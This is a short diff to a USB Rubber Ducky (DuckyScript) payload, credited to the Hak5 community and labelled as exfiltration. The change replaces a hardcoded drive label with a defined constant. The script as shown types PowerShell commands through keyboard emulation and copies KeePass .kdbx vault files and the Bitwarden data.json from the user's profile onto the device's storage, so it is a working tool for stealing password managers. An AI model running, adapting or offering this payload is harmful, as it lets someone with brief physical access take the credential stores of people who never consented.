@@ -7,12 +7,13 @@ REM Category: exfiltration
 REM Props: Hak5 Community
 
 ATTACKMODE HID STORAGE
+DEFINE #LABEL DUCKY
 DELAY 2000
 GUI r
 DELAY 500
 STRINGLN powershell 
 DELAY 500
-STRINGLN $vol=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter
+STRINGLN $vol=(Get-Volume -FileSystemLabel '#LABEL').DriveLetter
 STRINGLN mkdir $vol':\'VAULTS\
 STRINGLN dir "$env:USERPROFILE\Documents\*.kdbx" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
 STRINGLN dir "$env:APPDATA\Bitwarden\data.json" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
